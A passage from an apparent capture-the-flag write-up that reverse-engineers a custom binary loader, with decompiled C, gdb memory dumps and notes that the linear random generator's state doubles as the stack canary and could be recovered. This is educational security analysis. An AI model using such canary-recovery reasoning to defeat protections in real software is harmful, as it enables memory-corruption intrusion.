</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">byte</span> <span class="nf">rand_get_bit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">byte</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">byte</span> <span class="n">bVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">byte</span> <span class="n">bVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">byte</span> <span class="n">bVar4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">bVar1</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">bVar2</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3d</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">bVar3</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">bVar4</span> <span class="o">=</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">bVar1</span> <span class="o">=</span> <span class="n">bVar4</span> <span class="o">^</span> <span class="n">bVar1</span> <span class="o">^</span> <span class="n">bVar2</span> <span class="o">^</span> <span class="n">bVar3</span> <span class="o">^</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">rand_state</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">bVar1</span> <span class="o">|</span> <span class="n">rand_state</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">uint</span> <span class="nf">rand_extract_bit</span><span class="p">(</span><span class="n">byte</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">rand_state</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To explain this, basically, the way <code>rand</code> work is:</p>
<ul>
<li>Set <code>edi</code> before calling <code>rand()</code>. <code>edi</code> will be used as how many bits do the random integer that we want to generate. In this case, it is 64-bit (0x40).</li>
<li><code>rand_extract_bit(n)</code> is basically a function that will just take the n-th bit of the <code>rand_state</code></li>
<li><code>rand_get_bit()</code> is basically will generate a bit which is the result of:
<ul>
<li><code>rand_extract_bit(63) ^ rand_extract_bit(61) ^ rand_extract_bit(60) ^ rand_extract_bit(58) ^ 1</code>.</li>
<li>And also notice that after generating the random bit, it will remove the MSB of the <code>rand_state</code> by doing a left shift by 1 (<code>&lt;&lt; 1</code>), and then put the generated bit as the new LSB.</li>
</ul>
</li>
</ul>
<p>The rand method is pretty linear, so keep in mind that we might be able to recover this <code>rand_state</code> if we know enough of the result of <code>rand()</code> values.</p>
<p>Back to the <code>init_stack_guard</code> method, one of the important thing that we can notice from this method is that after calling this <code>rand()</code>, <strong>the <code>canary</code> is basically will be set as the latest <code>rand_state</code></strong>, which mean after this call, the next n <code>rand()</code> calls will be based on the <code>canary</code> of the binary as its initial state. This piece of information will be useful later.</p>
<h5 id="load-the-given-object-files-to-the-loader">Load the given object files to the loader</h5>
<p>Now, let&rsquo;s move to the below LOC</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">load_o_phase_1</span><span class="p">(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mh">0x268</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What is <code>files</code>? Inspecting it via gdb, it is an array consisting of our object filenames. (Notes that the <code>loader</code> binary is No PIE, so the address of global variables such as <code>files</code> and <code>rand_state</code> is consistent, which in this case, <code>files</code> address is <code>0x4041e0</code>).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  x/10gx 0x4041e0
</span></span><span class="line"><span class="cl">0x4041e0 &lt;files&gt;:	0x0000000000403000	0x0000000000403007
</span></span><span class="line"><span class="cl">0x4041f0 &lt;files+16&gt;:	0x0000000000403012	0x000000000040301a
</span></span><span class="line"><span class="cl">0x404200 &lt;files+32&gt;:	0x0000000000403022	0x0000000000403029
</span></span><span class="line"><span class="cl">0x404210 &lt;files+48&gt;:	0x000000000040302f	0x0000000000000000
</span></span><span class="line"><span class="cl">0x404220 &lt;o_info&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">gef➤  x/s 0x403000
</span></span><span class="line"><span class="cl">0x403000:	&#34;main.o&#34;
</span></span><span class="line"><span class="cl">gef➤  x/s 0x403007
</span></span><span class="line"><span class="cl">0x403007:	&#34;syscalls.o&#34;
</span></span><span class="line"><span class="cl">gef➤  x/s 0x403012
</span></span><span class="line"><span class="cl">0x403012:	&#34;guard.o&#34;
</span></span><span class="line"><span class="cl">gef➤  x/s 0x40301a
</span></span><span class="line"><span class="cl">0x40301a:	&#34;basic.o&#34;
</span></span><span class="line"><span class="cl">gef➤  x/s 0x403022
</span></span><span class="line"><span class="cl">0x403022:	&#34;game.o&#34;
</span></span><span class="line"><span class="cl">gef➤  x/s 0x403029
</span></span><span class="line"><span class="cl">0x403029:	&#34;res.o&#34;
</span></span><span class="line"><span class="cl">gef➤  x/s 0x40302f
</span></span><span class="line"><span class="cl">0x40302f:	&#34;debug.o&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, that LOC will iterate an array of object filenames, and then pass it to the <code>load_o_phase_1</code> method. To understand it better, let&rsquo;s check the method decompiled result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">load_o_phase_1</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">o_ctx</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">ushort</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_f8</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_c8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_68</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_60</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="o">*</span><span class="n">local_50</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">local_48</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">local_40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ushort</span> <span class="n">local_22</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">sys_open</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">o_ctx</span> <span class="o">=</span> <span class="n">iVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">o_ctx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">die</span><span class="p">(</span><span class="s">&#34;could not open file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">sys_fstat</span><span class="p">(</span><span class="o">*</span><span class="n">o_ctx</span><span class="p">,</span><span class="n">local_f8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">=</span> <span class="n">local_c8</span> <span class="o">+</span> <span class="mh">0xfffU</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">uVar3</span> <span class="o">=</span> <span class="n">sys_mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">6</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="o">*</span><span class="n">o_ctx</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">uVar3</span> <span class="o">=</span> <span class="n">aslr_get_addr</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">=</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">uVar3</span> <span class="o">=</span> <span class="n">mmap_or_die</span><span class="p">(</span><span class="n">local_20</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">)</span> <span class="o">=</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">       <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">       <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x3e</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                <span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_22</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">local_22</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xe</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;.symtab section not found - that</span><span class="se">\&#39;</span><span class="s">s somewhat unlikely&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;.strtab section not found - that</span><span class="se">\&#39;</span><span class="s">s somewhat unlikely&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="n">local_48</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span> <span class="n">local_48</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0x12</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">local_48</span> <span class="o">=</span> <span class="n">local_48</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_50</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_48</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xe</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_50</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">           <span class="p">(((</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_50</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_50</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">))))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">local_58</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">local_50</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">local_60</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">ushort</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_50</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">                                       <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">local_60</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">die</span><span class="p">(</span><span class="s">&#34;symbol refers to section that is not loaded&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="n">export_add</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="n">local_60</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_50</span> <span class="o">+</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_68</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">local_22</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_68</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LAB_00401af9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
